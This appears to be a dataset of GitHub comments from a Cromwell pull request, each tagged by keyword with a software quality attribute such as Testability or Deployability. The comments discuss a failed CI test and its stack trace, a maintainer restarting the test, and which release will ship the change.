https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:163,Testability,test,test,163,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:168,Testability,log,logs,168,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:227,Testability,log,log,227,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:397,Testability,test,test,397,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:515,Testability,test,test,515,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:591,Testability,test,test,591,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:628,Testability,Test,Test,628,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:656,Testability,test,test,656,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:709,Testability,Test,Test,709,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:743,Testability,test,test,743,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:796,Testability,Test,Test,796,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:830,Testability,test,test,830,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:883,Testability,Test,Test,883,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:921,Testability,test,test,921,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:974,Testability,Test,Test,974,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1012,Testability,test,test,1012,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1065,Testability,Test,Test,1065,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:62,Availability,fault,fault,62,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:159,Availability,error,error,159,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:180,Deployability,configurat,configuration,180,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:180,Modifiability,config,configuration,180,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:208,Safety,safe,safe,208,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:19,Testability,test,test,19,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:87,Testability,test,test,87,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754228301:40,Usability,feedback,feedback,40,"Thanks @cjllanwarne, I've actioned your feedback - I'll let you _Resolve conversation_.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754228301
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-884467881:51,Deployability,update,update,51,What version of cromwell will include this feature/update?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-884467881
